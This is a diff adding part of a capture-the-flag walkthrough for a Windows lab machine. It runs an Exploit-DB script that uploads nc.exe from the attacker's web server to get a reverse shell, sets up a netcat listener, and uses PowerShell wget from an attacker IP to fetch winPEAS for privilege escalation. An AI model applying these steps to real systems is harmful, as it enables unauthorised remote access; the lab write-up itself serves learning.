@@ -200,3 +200,49 @@ Remember the python script that I said you should save to your working directory
 
 If you didn't save it then no big deal you can just go to you directory and type:
 *cp /usr/share/exploitdb/exploits/windows/remote/39161.py* - this will copy the script to you current directory
+
+And also we will download the ncat.exe from the link provided - https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe
+
+When you download the exe file be sure to rename it to nc.exe since this is what the python script will recognize since it will upload this nc.exe to the target machine and use it for our revese shell.
+
+Renaming the exe file - *mv ncat.exe nc.exe*
+
+Okay so when we run the payload with python we will get an error saying that we have to provide the IP address and the port and when we go to the script 
+
+**FIY**: you have to run it with just python 39616.py <IP address> <port>, python3 will give you an error if you try
+
+SCRIPT PYTHON
+
+Here we see three things that will make this script work as its supposed to
+
+1. Usage : python Exploit.py <Target IP address> <Target Port Number>
+2. You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe) and you may need to run it multiple times for success!
+3. We have to set our local (tun0) IP address and the port that we will be listening on for the shell.
+
+First let set up a simple http server on our local machine, **be sure that you type this command while you are in the directory where the nc.exe  file is**:
+
+*sudo python3 -m http.server 80* - we have a web server running yay!
+
+Now open another terminal and lets configure our nc listener with the port we configured in our python script.
+
+*nc -lvnp 5553*
+
+The first time we run, we will acutually be transfering the nc.exe that we downloaded earlier and you should get 200 response on your web server:
+
+NC DOWNLOIAD img
+
+And the second time we run the script we will get a shell.
+Now we can go to bills Desktop and pull winpeas (if you need to find out if the system is x64 or x86 you can use this command - *wmic os get osarchitecture* )
+
+So our system is x64 we can use winPEASx64.exe that we can downlad from here - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe
+
+And again pull it over our web server so make sure you download this exe file in the same folder where your nc.exe is :)
+
+Then on our windows machine type:
+*powershell -c wget "http://10.14.7.187/winPEASx64.exe" -outfile winPEASx64.exe*
+
+This will download the winPEASx64.exe to our windows machine and you can run it with just *winPEASx64.exe*
+
+Yellow and red marked are the stuff that you should pay attention to.
+
+So I tried winPEASx64 as well as winPEASany.exe, but wasn't able to find anything, the x64 just stops at one point and doesn't execute I left it for 30 minutes nothing, then the ANY looked promising but then the same thing happens just at a different point.
